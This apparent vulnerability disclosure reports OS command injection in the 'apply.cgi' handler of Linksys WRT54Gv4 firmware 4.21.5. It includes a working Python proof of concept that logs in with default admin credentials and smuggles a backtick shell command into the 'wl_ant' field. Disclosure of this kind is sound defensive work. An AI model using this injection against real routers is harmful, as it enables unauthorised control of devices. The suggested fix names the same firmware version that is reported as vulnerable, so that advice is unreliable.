# CVE Report - Command Injection Vulnerability in FW_WRT54Gv4_4.21.5.000_20120220 Routers 

## Vulnerability Title

Command Injection Vulnerability in FW_WRT54Gv4_4.21.5.000_20120220 Router. 

## Vulnerability Description

Linksys FW_WRT54Gv4 devices have an OS command injection vulnerability in the CGl interface "apply.cgi",which allows remote attackers to execute arbitrary commands via parameter **wl_ant**  passed to the "apply.cgi" binary through a POST request.



## POC

```python
import requests

url = f"http://{ip}/apply.cgi"

headers = {
    "Host": ip,
    "Content-Length": "146",
    "Cache-Control": "max-age=0",
    "Authorization": "Basic YWRtaW46YWRtaW4=",
    "Accept-Language": "zh-CN",
    "Upgrade-Insecure-Requests": "1",
    "Origin": f"http://{ip}",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive"
}

data = {
    "StartEPI": "1",
    "wl_ant": "`touch 1.txt`",
}

response = requests.post(url, headers=headers, data=data)

print("Status Code:", response.status_code)
print("Response Content:", response.text)

```



## Cause Analysis

The get_cgi function accepts external data. The user affects v5 by setting the wl_ant value. It enters system execution, resulting in a command execution vulnerability.

![image](https://github.com/user-attachments/assets/702617ff-8bec-4eb0-b580-4d4b2ebde5d8)

![image](https://github.com/user-attachments/assets/21ca4de6-052a-4d58-ab08-c2b984e23fd8)

## Suggested Fix

It is recommended to update to the version FW_WRT54Gv4_4.21.5 of router to fix this vulnerability. 

